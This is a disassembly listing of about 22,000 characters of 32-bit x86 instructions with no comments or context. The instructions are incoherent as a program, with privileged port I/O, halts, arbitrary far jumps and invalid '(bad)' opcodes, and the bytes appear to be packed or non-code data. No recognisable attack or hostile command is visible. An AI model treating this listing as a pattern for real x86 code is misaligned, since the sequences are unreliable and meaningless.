  40fa41:	cmp    cl,bh
  40fa43:	inc    eax
  40fa44:	mov    ebx,0x887c51eb
  40fa49:	xchg   edx,eax
  40fa4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa4b:	ins    DWORD PTR es:[edi],dx
  40fa4c:	pop    ebp
  40fa4d:	out    dx,al
  40fa4e:	cs es sub ah,al
  40fa52:	out    0x30,eax
  40fa54:	jne    0x40fa59
  40fa56:	cli    
  40fa57:	sbb    eax,0x6cd6f3f9
  40fa5c:	push   esi
  40fa5d:	cmp    esp,DWORD PTR [edx+eax*1-0x51610eb3]
  40fa64:	push   ecx
  40fa65:	adc    eax,0x7d1c3759
  40fa6a:	mov    cl,0x78
  40fa6c:	inc    edx
  40fa6d:	mov    ah,0x81
  40fa6f:	cmp    BYTE PTR [edi],dh
  40fa71:	adc    DWORD PTR ds:[ecx+0x645e9e16],0x4dc48625
  40fa7c:	mov    bh,BYTE PTR ss:[ecx+ecx*8-0x13]
  40fa81:	cs aam 0x18
  40fa84:	sbb    al,0x51
  40fa86:	mov    al,ds:0xfc389910
  40fa8b:	rol    BYTE PTR [ecx+0x7a],1
  40fa8e:	xchg   DWORD PTR [ebx-0x6e],esi
  40fa91:	jo     0x40fa7b
  40fa93:	sub    ecx,DWORD PTR ds:0x617a3ba8
  40fa99:	call   0x4423e216
  40fa9e:	js     0x40fabd
  40faa0:	lahf   
  40faa1:	fisttp QWORD PTR [esi]
  40faa3:	lods   eax,DWORD PTR ds:[esi]
  40faa4:	out    0xcd,al
  40faa6:	bound  eax,QWORD PTR [esi-0x6800950a]
  40faac:	into   
  40faad:	push   ds
  40faae:	sbb    al,0xdf
  40fab0:	push   ebp
  40fab1:	xor    BYTE PTR [eax+0x7c],cl
  40fab4:	call   0x5715:0xc9f95e33
  40fabb:	mov    ecx,esi
  40fabd:	add    al,0xf3
  40fabf:	retf   
  40fac0:	jb     0x40fb37
  40fac2:	mov    eax,ds:0x9eb12ef4
  40fac7:	imul   ecx,edi,0xc9d3046c
  40facd:	dec    edi
  40face:	xor    al,0xb4
  40fad1:	popa   
  40fad2:	out    dx,eax
  40fad3:	push   0xe5f0c28c
  40fad8:	(bad)  
  40fad9:	je     0x40fb13
  40fadb:	je     0x40fab8
  40fadd:	cld    
  40fade:	adc    BYTE PTR [ebx],bl
  40fae0:	scas   al,BYTE PTR es:[edi]
  40fae1:	nop
  40fae2:	hlt    
  40fae3:	inc    ebx
  40fae4:	ja     0x40fb11
  40fae6:	std    
  40fae7:	ds in  eax,0xde
  40faea:	inc    esi
  40faeb:	ja     0x40fac2
  40faed:	fimul  WORD PTR [ebx-0x21]
  40faf0:	cmp    eax,edi
  40faf2:	lods   al,BYTE PTR ds:[esi]
  40faf3:	mov    WORD PTR [edi+0x0],cs
  40faf6:	inc    ebx
  40faf7:	jmp    0x40fb49
  40faf9:	retf   0xb8ad
  40fafc:	mov    dh,BYTE PTR [esi]
  40fafe:	rcr    DWORD PTR [ebx+0x32875b15],0xfc
  40fb05:	(bad)  [edi-0x384fa8b6]
  40fb0b:	(bad)  
  40fb0c:	push   ecx
  40fb0d:	sbb    ebp,DWORD PTR [ebp-0x2fc3c352]
  40fb13:	mov    al,0x92
  40fb15:	fisub  WORD PTR gs:[edi-0x52]
  40fb19:	inc    ebx
  40fb1a:	iret   
  40fb1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb1c:	imul   BYTE PTR [edx-0x30]
  40fb1f:	xchg   bh,dh
  40fb21:	inc    ecx
  40fb22:	call   0x4cfc:0x8f9a960b
  40fb29:	ror    BYTE PTR [edx-0x41b7bb6a],cl
  40fb2f:	lock retf 0x64aa
  40fb33:	mov    ebp,0x5091b93b
  40fb38:	shl    DWORD PTR [esi+eiz*8],1
  40fb3b:	or     cl,BYTE PTR [ebx+eiz*8-0x33]
  40fb3f:	mov    al,ds:0xc382d965
  40fb44:	dec    ebx
  40fb45:	push   es
  40fb46:	fiadd  DWORD PTR [edx+0x385b761]
  40fb4c:	mov    ecx,0xb61798ff
  40fb51:	dec    esi
  40fb52:	not    esp
  40fb54:	fwait
  40fb55:	mov    bl,al
  40fb57:	add    bh,bl
  40fb59:	fwait
  40fb5a:	push   0xffffffde
  40fb5c:	jmp    0xaabb249b
  40fb61:	mov    al,ds:0xe527c7e9
  40fb66:	sar    DWORD PTR [ecx],cl
  40fb68:	pusha  
  40fb69:	dec    esp
  40fb6a:	stos   DWORD PTR es:[edi],eax
  40fb6b:	clc    
  40fb6c:	jb     0x40fb22
  40fb6e:	ficomp DWORD PTR [eax-0x5d]
  40fb71:	lods   al,BYTE PTR ds:[esi]
  40fb72:	not    DWORD PTR [edx-0x48c8e210]
  40fb78:	into   
  40fb79:	ret    
  40fb7a:	pop    edx
  40fb7b:	int    0x72
  40fb7d:	cwde   
  40fb7e:	pop    edi
  40fb7f:	inc    ebp
  40fb80:	shl    ebx,0x1e
  40fb83:	jl     0x40fb9a
  40fb85:	jmp    0x40fbd1
  40fb87:	(bad)  [ebx-0x11]
  40fb8a:	call   DWORD PTR [esi-0x65]
  40fb8d:	fcmovne st,st(4)
  40fb8f:	(bad)  
  40fb90:	int3   
  40fb91:	imul   DWORD PTR ds:0xd2808646
  40fb97:	loop   0x40fb2f
  40fb99:	sahf   
  40fb9a:	mov    al,ds:0x2ecd885d
  40fb9f:	cmp    BYTE PTR [ebx-0x5eeefa15],bl
  40fba5:	pop    ebp
  40fba6:	and    ebx,DWORD PTR [esi-0xa46bee4]
  40fbac:	ret    0xbf1f
  40fbaf:	adc    eax,0xc808bac2
  40fbb4:	test   DWORD PTR [ecx+0x4a78f88b],ebp
  40fbba:	jo     0x40fb97
  40fbbc:	stos   DWORD PTR es:[edi],eax
  40fbbd:	jg     0x40fba4
  40fbbf:	shl    DWORD PTR [ebx+0x35e7617e],1
  40fbc5:	jmp    0x4ba2efde
  40fbca:	int    0xe3
  40fbcc:	jmp    0x40fbdd
  40fbce:	add    eax,0x87f01e47
  40fbd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd4:	and    eax,0x91ae65be
  40fbd9:	cld    
  40fbda:	xor    al,0xbc
  40fbdc:	dec    edi
  40fbdd:	callw  0x7676
  40fbe1:	xor    DWORD PTR [ebp+0x33],esp
  40fbe4:	ins    BYTE PTR es:[edi],dx
  40fbe5:	jle    0x40fc0e
  40fbe7:	inc    eax
  40fbe8:	test   al,0xf4
  40fbea:	scas   eax,DWORD PTR es:[edi]
  40fbeb:	mov    al,ds:0xc0d827db
  40fbf0:	in     eax,dx
  40fbf1:	pop    esp
  40fbf2:	shr    BYTE PTR [eax+0x65b4f21a],cl
  40fbf8:	pop    edx
  40fbf9:	dec    esp
  40fbfa:	out    0x8f,al
  40fbfc:	push   eax
  40fbfd:	mov    edi,0x67e867e1
  40fc02:	cli    
  40fc03:	imul   edi,ebx,0xffffffe4
  40fc06:	xchg   bh,al
  40fc08:	stc    
  40fc09:	lock lock bound esi,QWORD PTR [esi+0x1ddba271]
  40fc11:	jae    0x40fc46
  40fc13:	fs push cs
  40fc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc16:	xor    al,0x85
  40fc18:	int3   
  40fc19:	cmp    ah,BYTE PTR [edx-0x2c]
  40fc1c:	jmp    FWORD PTR [esi+0x75]
  40fc1f:	stc    
  40fc20:	pop    ss
  40fc21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc22:	push   ss
  40fc23:	xor    BYTE PTR [esi+0x1eb41ac1],dh
  40fc29:	mov    eax,ds:0x66b14ec1
  40fc2e:	or     BYTE PTR [eax+0x1745b6bb],bh
  40fc34:	test   BYTE PTR [esi],ch
  40fc36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc37:	mov    ch,0xfd
  40fc39:	cmp    eax,0xf4a7fb2b
  40fc3e:	sub    BYTE PTR [ecx+ecx*1+0x430e37fc],0x98
  40fc46:	xchg   ebp,eax
  40fc47:	daa    
  40fc48:	daa    
  40fc49:	jp     0x40fbf9
  40fc4b:	jne    0x40fbfc
  40fc4d:	sbb    esi,edi
  40fc4f:	mov    ah,0xed
  40fc51:	push   ds
  40fc52:	push   esi
  40fc53:	xchg   esp,eax
  40fc54:	fsub   QWORD PTR [ebp-0x4c9fc971]
  40fc5a:	mov    DWORD PTR [ebp-0xff5d51f],ecx
  40fc60:	xchg   ecx,eax
  40fc61:	cmp    DWORD PTR [edx],0x65
  40fc64:	inc    esp
  40fc65:	retf   0x86f0
  40fc68:	mov    ds,WORD PTR [esi]
  40fc6a:	adc    ch,BYTE PTR [edi]
  40fc6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc6d:	cs pushf 
  40fc6f:	lock push eax
  40fc71:	push   0xbc4f2bac
  40fc76:	ja     0x40fc7a
  40fc78:	cmp    eax,0x8bc03155
  40fc7d:	dec    ebx
  40fc7e:	and    edx,edi
  40fc80:	mov    edi,0x9b74390d
  40fc85:	retf   
  40fc86:	mov    edx,0x55e84b99
  40fc8b:	push   0x31
  40fc8d:	pushf  
  40fc8e:	xchg   esp,eax
  40fc8f:	mov    bl,0x37
  40fc91:	xchg   ebp,eax
  40fc92:	adc    al,0x4f
  40fc94:	and    DWORD PTR [esi],ebp
  40fc96:	mov    edi,0x44f4d458
  40fc9b:	lods   eax,DWORD PTR ds:[esi]
  40fc9c:	xor    BYTE PTR [esi-0xe],cl
  40fc9f:	and    ah,ah
  40fca1:	call   0x8763:0x9bc0c8c4
  40fca8:	inc    ecx
  40fca9:	xchg   esp,eax
  40fcaa:	imul   esi,DWORD PTR [eax],0xffffffa7
  40fcad:	add    al,0xf3
  40fcaf:	and    DWORD PTR [ecx],0x44
  40fcb2:	in     al,0xad
  40fcb4:	push   edi
  40fcb5:	sbb    edi,eax
  40fcb7:	push   edi
  40fcb8:	xchg   ebp,eax
  40fcb9:	loopne 0x40fd27
  40fcbb:	std    
  40fcbc:	adc    ecx,0xffffffde
  40fcbf:	shl    DWORD PTR [ebp+0x43],1
  40fcc2:	jae    0x40fc89
  40fcc4:	loop   0x40fcbe
  40fcc6:	xchg   ecx,eax
  40fcc7:	test   eax,0x13e7476f
  40fccc:	bound  ecx,QWORD PTR [ebx-0x772f874]
  40fcd2:	adc    BYTE PTR [edi+edi*8+0x60855dab],0x40
  40fcda:	sub    al,0xe
  40fcdc:	mov    eax,DWORD PTR [edi-0x1f]
  40fcdf:	dec    ecx
  40fce0:	out    0xcc,eax
  40fce2:	or     al,0x3a
  40fce4:	jae    0x40fca9
  40fce6:	es jbe 0x40fca6
  40fce9:	dec    ebx
  40fcea:	cld    
  40fceb:	rcr    BYTE PTR [eax+edi*2-0x72],1
  40fcef:	mov    dl,0x7c
  40fcf1:	addr16 add al,0xd5
  40fcf4:	push   edx
  40fcf5:	test   ch,cl
  40fcf7:	js     0x40fcac
  40fcf9:	(bad)  
  40fcfa:	pop    ebx
  40fcfb:	or     ch,BYTE PTR [esi]
  40fcfd:	je     0x40fd26
  40fcff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd00:	test   DWORD PTR [ebx-0x44],ebp
  40fd03:	sbb    esi,ecx
  40fd05:	enter  0xdb52,0xb9
  40fd09:	xor    al,0x47
  40fd0b:	out    dx,eax
  40fd0c:	fstp   st(1)
  40fd0e:	mov    dh,ch
  40fd10:	jne    0x40fcc8
  40fd12:	in     ax,0x65
  40fd15:	int3   
  40fd16:	jns    0x40fcbb
  40fd18:	sbb    al,0x40
  40fd1a:	push   ss
  40fd1b:	ins    DWORD PTR es:[edi],dx
  40fd1c:	aam    0x35
  40fd1e:	in     eax,dx
  40fd1f:	inc    edx
  40fd21:	sti    
  40fd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd23:	and    dl,dl
  40fd25:	xor    DWORD PTR [edx],0x4d
  40fd28:	mov    dh,0xeb
  40fd2a:	retf   0x200e
  40fd2d:	push   esp
  40fd2e:	das    
  40fd2f:	xchg   ebx,eax
  40fd30:	ins    BYTE PTR es:[edi],dx
  40fd31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd32:	dec    edx
  40fd33:	pop    edx
  40fd34:	mov    BYTE PTR [edx+0x40671c21],dl
  40fd3a:	mov    al,al
  40fd3c:	pop    es
  40fd3d:	mov    ecx,DWORD PTR [ebp+ebx*8-0x695bcabd]
  40fd44:	adc    eax,0xdec97899
  40fd4a:	xor    ch,BYTE PTR [ecx+0x17e2e50d]
  40fd50:	push   0x7c8ef243
  40fd55:	push   ds
  40fd56:	aam    0x67
  40fd58:	mov    WORD PTR [eax],ds
  40fd5a:	push   ebx
  40fd5b:	mov    dl,0x60
  40fd5d:	and    DWORD PTR [eax+0x489f583f],0xffffff93
  40fd64:	sub    eax,0xf6233723
  40fd69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd6a:	xor    BYTE PTR [edi+0x28],cl
  40fd6d:	and    DWORD PTR [edi],esi
  40fd6f:	sub    BYTE PTR [ebp+0x56],bl
  40fd72:	scas   eax,DWORD PTR es:[edi]
  40fd73:	inc    esp
  40fd74:	not    BYTE PTR [edx]
  40fd76:	mov    edi,0x6ff76b78
  40fd7b:	dec    BYTE PTR [edx+eiz*4+0x6ab8d97c]
  40fd82:	test   al,0x81
  40fd84:	int    0xc8
  40fd86:	lea    edx,[ecx-0xd637a29]
  40fd8c:	add    DWORD PTR [ebx],ecx
  40fd8e:	jno    0x40fd88
  40fd90:	out    0x98,eax
  40fd92:	loop   0x40fd7b
  40fd94:	mov    BYTE PTR [eax],0xbd
  40fd97:	mov    bh,0x97
  40fd99:	mov    bl,0x1e
  40fd9b:	aas    
  40fd9c:	sti    
  40fd9d:	xchg   esi,eax
  40fd9e:	gs jle 0x40fdc0
  40fda1:	xlat   BYTE PTR ds:[ebx]
  40fda2:	fstp   QWORD PTR [ebx+0x477d8eec]
  40fda8:	mov    al,ds:0x42cc37f6
  40fdad:	mov    eax,ds:0x66f502de
  40fdb2:	mov    bl,0x45
  40fdb4:	jge    0x40fdef
  40fdb6:	mov    edx,0x672f506e
  40fdbb:	in     eax,dx
  40fdbc:	popa   
  40fdbd:	data16 mov dh,BYTE PTR [ebx]
  40fdc0:	mov    edi,0x2f7d7fdc
  40fdc5:	add    DWORD PTR [ebp-0x28],edx
  40fdc8:	mov    ds:0xe2882cf5,eax
  40fdcd:	mov    ebx,0x9a7d997
  40fdd2:	scas   eax,DWORD PTR es:[edi]
  40fdd3:	fwait
  40fdd4:	dec    esp
  40fdd5:	mov    edx,0x609a6256
  40fdda:	fld    QWORD PTR [ebx+ebp*8+0x50]
  40fdde:	inc    ebp
  40fddf:	mov    BYTE PTR [eax-0x3c],ah
  40fde2:	les    ebx,FWORD PTR [ebx-0x79]
  40fde5:	aaa    
  40fde6:	xrelease mov BYTE PTR [ebp-0x231152e5],bh
  40fded:	mov    ecx,0xb09af464
  40fdf2:	inc    DWORD PTR [edi-0x34]
  40fdf5:	dec    ebp
  40fdf6:	sub    BYTE PTR [eax],bl
  40fdf8:	fbld   TBYTE PTR [ebx+0x6fe6f334]
  40fdfe:	push   eax
  40fdff:	mov    dl,0x77
  40fe01:	jmp    0xea11:0x91f86b7d
  40fe08:	je     0x40fdb4
  40fe0a:	xor    cl,BYTE PTR [ecx-0x6f]
  40fe0d:	repnz aad 0xbf
  40fe10:	aad    0x11
  40fe12:	cmp    ch,bl
  40fe14:	packssdw mm2,QWORD PTR [edx+0x49]
  40fe18:	dec    edx
  40fe19:	into   
  40fe1a:	outs   dx,BYTE PTR ds:[esi]
  40fe1b:	push   0x4a
  40fe1d:	add    ebx,DWORD PTR [esi]
  40fe1f:	pusha  
  40fe20:	sbb    DWORD PTR [ecx+0x5b],eax
  40fe23:	in     al,0x48
  40fe25:	ins    DWORD PTR es:[edi],dx
  40fe26:	add    dh,bh
  40fe28:	fnstcw WORD PTR [ecx+eax*2+0x7fddf7d7]
  40fe2f:	mov    dh,0xac
  40fe31:	mov    ecx,0x3740f4c9
  40fe36:	retf   0xb0fd
  40fe39:	repz gs sub ah,dh
  40fe3d:	hlt    
  40fe3e:	inc    edx
  40fe3f:	lock call 0x9e8d:0x125d87c0
  40fe47:	jle    0x40fe66
  40fe49:	stos   BYTE PTR es:[edi],al
  40fe4a:	inc    ebp
  40fe4b:	pop    es
  40fe4c:	mov    esp,0xe6873fff
  40fe51:	pop    ecx
  40fe52:	repnz pop ebp
  40fe54:	mov    al,ds:0x6739db96
  40fe59:	enter  0x6d45,0x37
  40fe5d:	pop    es
  40fe5e:	and    eax,0x5f26998
  40fe63:	push   ebp
  40fe64:	cs xor bl,ah
  40fe67:	ss inc ecx
  40fe69:	ret    0x9ace
  40fe6c:	xor    ecx,0xaf24f817
  40fe72:	sahf   
  40fe73:	fwait
  40fe74:	and    BYTE PTR [edi+0x22c10912],bl
  40fe7a:	sbb    cl,al
  40fe7c:	imul   eax,DWORD PTR [ecx-0x59],0x2a62b3ec
  40fe83:	pop    ebx
  40fe84:	jo     0x40fed6
  40fe86:	mov    eax,ds:0x6e278a75
  40fe8b:	and    eax,DWORD PTR [edi+0x7a3553e]
  40fe91:	ret    0x9ac
  40fe94:	in     al,0xe1
  40fe96:	lahf   
  40fe97:	dec    ch
  40fe99:	sbb    dl,dl
  40fe9b:	nop
  40fe9c:	fdivr  QWORD PTR [eax+edi*1-0x454e155b]
  40fea3:	xchg   ebx,eax
  40fea4:	lahf   
  40fea5:	xchg   ecx,eax
  40fea6:	ret    0x487
  40fea9:	mov    ebp,0x8fc8971f
  40feae:	pop    esi
  40feaf:	push   0x44
  40feb1:	aas    
  40feb2:	lds    ebp,FWORD PTR [edi+0x49]
  40feb5:	out    dx,eax
  40feb6:	out    0xa7,al
  40feb8:	mov    edi,0x9f025dd3
  40febd:	jl     0x40fe62
  40febf:	retf   0xa058
  40fec2:	mov    ds:0x7fd5b6ae,al
  40fec7:	test   al,0x36
  40fec9:	mov    BYTE PTR [eax-0x2db11e6a],bh
  40fecf:	fisttp DWORD PTR [eax]
  40fed1:	ds xchg ebx,ebp
  40fed4:	test   BYTE PTR [esi],dh
  40fed6:	cmp    edx,edi
  40fed8:	ins    DWORD PTR es:[edi],dx
  40fed9:	xchg   dh,ch
  40fedb:	and    ecx,DWORD PTR [esi+0x24c1202b]
  40fee1:	and    esi,0xffffffbc
  40fee4:	das    
  40fee5:	xchg   BYTE PTR [ebx-0x36],ah
  40fee8:	mov    ah,0x9
  40feea:	int3   
  40feeb:	ins    DWORD PTR es:[edi],dx
  40feec:	test   DWORD PTR [eax],ebx
  40feee:	hlt    
  40feef:	push   ecx
  40fef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef1:	lock fdiv DWORD PTR [ecx]
  40fef4:	pop    ss
  40fef5:	neg    DWORD PTR [ecx-0x2b]
  40fef8:	lahf   
  40fef9:	fld1   
  40fefb:	mov    al,ds:0xd58feb75
  40ff00:	sahf   
  40ff01:	int    0x89
  40ff03:	popf   
  40ff04:	add    ebp,edx
  40ff06:	shl    DWORD PTR [ebp+0x73],0xc0
  40ff0a:	or     dh,dh
  40ff0c:	outs   dx,DWORD PTR ds:[esi]
  40ff0d:	scas   al,BYTE PTR es:[edi]
  40ff0e:	sbb    eax,0xb1105984
  40ff13:	repz add al,0x70
  40ff16:	rcl    BYTE PTR [esi+0x4a],0x5
  40ff1a:	cmc    
  40ff1b:	or     dl,BYTE PTR [ebx+0x7b3b57e9]
  40ff21:	mov    cl,0xfa
  40ff23:	dec    edi
  40ff24:	jnp    0x40fef9
  40ff26:	cli    
  40ff27:	xchg   edx,eax
  40ff28:	in     al,0x8c
  40ff2a:	ins    DWORD PTR es:[edi],dx
  40ff2b:	lahf   
  40ff2c:	cmp    eax,0x236165c8
  40ff31:	inc    ebp
  40ff32:	adc    eax,0x38d51635
  40ff37:	add    DWORD PTR [ebx],eax
  40ff39:	xor    DWORD PTR [edi],ecx
  40ff3b:	cdq    
  40ff3c:	dec    ecx
  40ff3d:	adc    DWORD PTR [ecx+0x7fb25b9a],ecx
  40ff43:	int    0xa4
  40ff45:	jmp    0x40ff58
  40ff47:	jnp    0x40ff0e
  40ff49:	inc    esi
  40ff4a:	ret    0x154d
  40ff4d:	clc    
  40ff4e:	cmp    esi,DWORD PTR [eax]
  40ff50:	pop    ds
  40ff51:	jne    0x40ff30
  40ff53:	retf   0x6412
  40ff56:	out    dx,al
  40ff57:	push   ebx
  40ff58:	jg     0x40fefe
  40ff5a:	mov    ebx,0x79efd454
  40ff5f:	test   eax,0xd6a862b9
  40ff64:	daa    
  40ff65:	xchg   esi,eax
  40ff66:	fidivr WORD PTR [ecx-0x56]
  40ff69:	ins    BYTE PTR es:[edi],dx
  40ff6a:	adc    edi,ebx
  40ff6c:	inc    edi
  40ff6d:	xchg   esi,eax
  40ff6e:	lods   eax,DWORD PTR ds:[esi]
  40ff6f:	je     0x40ff70
  40ff71:	dec    edi
  40ff72:	sbb    ebx,0x3f6a4aee
  40ff78:	or     BYTE PTR [ebx],ch
  40ff7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff7b:	xchg   DWORD PTR ds:0xbbfc259e,ebp
  40ff81:	mov    eax,0x82748284
  40ff86:	sub    BYTE PTR [ebp+0x15ae1b6b],0x6
  40ff8d:	xchg   BYTE PTR [ebx+0x1c],al
  40ff90:	jmp    0xbcc0:0xfa36e14a
  40ff97:	pop    edx
  40ff98:	popf   
  40ff99:	xor    edx,edi
  40ff9b:	call   0xcd150270
  40ffa0:	xlat   BYTE PTR ds:[ebx]
  40ffa1:	mov    ebp,0x5c9adc51
  40ffa6:	test   eax,0xd7f6b415
  40ffab:	je     0x40ff62
  40ffad:	xor    BYTE PTR [esi],dh
  40ffaf:	mov    bh,0x5d
  40ffb1:	loop   0x40fffd
  40ffb3:	icebp  
  40ffb4:	mov    al,0xae
  40ffb6:	fstp   DWORD PTR [ebx+0x2fdc8d82]
  40ffbc:	push   cs
  40ffbd:	pop    esi
  40ffbe:	test   BYTE PTR [eax-0x7d],ch
  40ffc1:	int    0x9d
  40ffc3:	out    0xaf,al
  40ffc5:	mov    ebp,eax
  40ffc7:	fild   QWORD PTR [edi-0x51]
  40ffca:	push   ecx
  40ffcb:	in     eax,0x14
  40ffcd:	clc    
  40ffce:	popa   
  40ffcf:	dec    ebx
  40ffd0:	dec    edx
  40ffd1:	mov    fs,WORD PTR [edx]
  40ffd3:	add    eax,0x413ebefd
  40ffd8:	sbb    cl,ch
  40ffda:	repz hlt 
  40ffdc:	xchg   ebx,eax
  40ffdd:	jge    0x40ff72
  40ffdf:	les    esi,FWORD PTR [edi+0x51239f75]
  40ffe5:	daa    
  40ffe6:	fst    st(6)
  40ffe8:	inc    ebp
  40ffe9:	loop   0x41000e
  40ffeb:	inc    ebp
  40ffec:	xor    esi,DWORD PTR [edx]
  40ffee:	in     eax,dx
  40ffef:	add    DWORD PTR [ebp*4-0x5aec89c6],0xffffffb5
  40fff7:	dec    ecx
  40fff8:	out    0x88,eax
  40fffa:	cmp    eax,0xaec34139
  40ffff:	call   0x3d35:0x791ec780
  410006:	ffreep st(5)
  410008:	sti    
  410009:	xchg   DWORD PTR [edx],edx
  41000b:	arpl   si,bx
  41000d:	and    al,BYTE PTR [ebp-0x77]
  410010:	add    al,0xf5
  410012:	daa    
  410013:	nop
  410014:	pop    esp
  410015:	in     eax,dx
  410016:	ficomp WORD PTR [esi-0x28]
  410019:	xor    eax,ebx
  41001b:	cmp    DWORD PTR [ebx-0x1e7dbdfa],edx
  410021:	sub    eax,0x95cdc72f
  410026:	push   ecx
  410027:	pop    ds
  410028:	inc    esi
  410029:	sbb    eax,0x86dae905
  41002e:	or     al,0xa1
  410030:	add    eax,0x483d90bd
  410035:	mov    dh,0x41
  410037:	jecxz  0x410005
  410039:	jae    0x41002b
  41003b:	inc    ebp
  41003c:	aas    
  41003d:	jmp    0x410085
  41003f:	imul   edi,DWORD PTR [esi],0x8b757f89
  410045:	adc    ebx,ebx
  410047:	test   eax,0xe9b02f62
  41004c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41004d:	aad    0x79
  41004f:	xchg   BYTE PTR [edi],dh
  410051:	dec    esp
  410052:	in     al,0x71
  410054:	nop
  410055:	pop    ecx
  410056:	ins    BYTE PTR es:[edi],dx
  410057:	leave  
  410058:	call   0x1d735359
  41005d:	ins    BYTE PTR es:[edi],dx
  41005e:	cmp    al,0xb
  410060:	push   esi
  410061:	aas    
  410062:	and    al,BYTE PTR [ebp+0x4e89ccdf]
  410068:	adc    eax,0x7eee0b65
  41006d:	mov    ecx,0x5fd2377a
  410072:	push   esp
  410073:	loop   0x4100c1
  410075:	jecxz  0x4100bf
  410077:	sub    DWORD PTR [ebx],0x10
  41007a:	xchg   ecx,eax
  41007b:	mov    dl,0x2e
  41007d:	sub    ah,ch
  41007f:	das    
  410080:	fsubr  DWORD PTR [ebx-0x7b561152]
  410086:	ss jae 0x4100ad
  410089:	jmp    0xa453:0x6b76d29b
  410090:	mov    dh,0xa3
  410092:	sbb    BYTE PTR ds:0x7dc2934a,ch
  410098:	inc    ebp
  410099:	(bad)  
  41009a:	(bad)  
  41009c:	adc    al,0xd7
  41009e:	ret    
  41009f:	dec    eax
  4100a0:	and    dl,BYTE PTR [ebx+0x29]
  4100a3:	or     BYTE PTR [edi-0x75b85519],bl
  4100a9:	cs xchg ebx,eax
  4100ab:	daa    
  4100ac:	jb     0x410108
  4100ae:	mov    ebp,0x77945704
  4100b3:	hlt    
  4100b4:	enter  0xcff8,0x2f
  4100b8:	mov    DWORD PTR [esi],ebp
  4100ba:	int3   
  4100bb:	imul   edx,DWORD PTR [ebx+edi*4+0x8],0x8
  4100c0:	jge    0x4100d4
  4100c2:	loop   0x41010d
  4100c4:	dec    ebx
  4100c5:	js     0x4100db
  4100c7:	sub    DWORD PTR [eax+eax*8],edi
  4100ca:	dec    edx
  4100cb:	add    BYTE PTR [eax+0x655b1ca7],bh
  4100d1:	cs xchg ecx,eax
  4100d3:	mov    ch,0xd1
  4100d5:	lock cmc 
  4100d7:	xor    ch,ch
  4100d9:	(bad)  
  4100db:	les    ebp,FWORD PTR [esi-0x72]
  4100de:	add    al,0x9d
  4100e0:	aam    0x7
  4100e2:	popf   
  4100e3:	xchg   ebp,eax
  4100e4:	stc    
  4100e5:	dec    ecx
  4100e6:	jns    0x410140
  4100e8:	sub    BYTE PTR ss:[edi+ebp*2+0x528f50c8],bh
  4100f0:	(bad)  
  4100f1:	pop    esi
  4100f2:	dec    edx
  4100f3:	add    DWORD PTR [edx],ebx
  4100f5:	xor    DWORD PTR [ebx+eiz*8],0x4e03f7fb
  4100fc:	push   ebx
  4100fd:	sbb    dl,BYTE PTR [edi+ebp*1+0x39287cf3]
  410104:	pop    ebx
  410105:	shl    DWORD PTR [ecx-0x26],0x6f
  410109:	loop   0x410183
  41010b:	fidiv  DWORD PTR [edx]
  41010d:	xchg   esi,eax
  41010e:	mov    ebx,0xb34e5ba
  410113:	std    
  410114:	xchg   DWORD PTR [edx+eax*1],edi
  410117:	mov    dh,0x1e
  410119:	lahf   
  41011a:	or     ch,BYTE PTR [edi-0x2bc6caf8]
  410120:	stos   DWORD PTR es:[edi],eax
  410121:	fnstenv [edx+esi*8]
  410124:	call   0xe59103e6
  410129:	cld    
  41012a:	outs   dx,DWORD PTR ds:[esi]
  41012b:	cld    
  41012c:	push   esp
  41012d:	jmp    0x41011d
  41012f:	fst    QWORD PTR [edi]
  410131:	scas   al,BYTE PTR es:[edi]
  410132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410133:	or     BYTE PTR [esi+0x60decf76],bl
  410139:	mov    dl,0x1c
  41013b:	push   edi
  41013c:	test   eax,0xea2a4ce8
  410141:	out    dx,eax
  410142:	int3   
  410143:	push   cs
  410144:	aam    0x24
  410146:	mov    DWORD PTR [ebp-0x2e375170],esp
  41014c:	xor    al,bl
  41014e:	iret   
  41014f:	ja     0x4101c0
  410151:	mov    esp,0xf48796c0
  410156:	inc    ebp
  410157:	lods   al,BYTE PTR ds:[esi]
  410158:	fdiv   st,st(5)
  41015a:	xchg   edx,eax
  41015b:	mov    esp,0xd747318b
  410160:	or     DWORD PTR [edx],esi
  410162:	or     edi,DWORD PTR ds:0x1fa870ca
  410168:	pop    ss
  410169:	ret    
  41016a:	inc    edx
  41016b:	hlt    
  41016c:	imul   edi,DWORD PTR [edi],0x60
  41016f:	outs   dx,DWORD PTR ds:[esi]
  410170:	mov    ch,0x8b
  410172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410173:	test   DWORD PTR [edi-0x33],eax
  410176:	fwait
  410177:	and    eax,0x956b05fe
  41017c:	inc    ebp
  41017d:	mov    gs,WORD PTR [edi]
  41017f:	sbb    al,BYTE PTR [ebx-0x78]
  410182:	pop    esi
  410183:	add    eax,0x3ca708f
  410188:	imul   edi,edi,0x6a
  41018b:	add    eax,0xbfea9e3c
  410190:	pop    esp
  410191:	push   ecx
  410192:	dec    edi
  410193:	nop
  410194:	jbe    0x410142
  410196:	jb     0x410149
  410198:	mov    edi,0x2eff779e
  41019d:	aas    
  41019e:	pop    esp
  41019f:	add    eax,0x6423ccfc
  4101a4:	out    dx,al
  4101a5:	cmp    al,0x5e
  4101a7:	xor    DWORD PTR [ebp+eax*4+0x16781a9e],esp
  4101ae:	dec    ecx
  4101af:	clc    
  4101b0:	pop    eax
  4101b1:	pop    ebp
  4101b2:	mov    edi,0x62392d6c
  4101b7:	mov    ds:0x21976c23,al
  4101bc:	aaa    
  4101bd:	daa    
  4101be:	pop    eax
  4101bf:	aas    
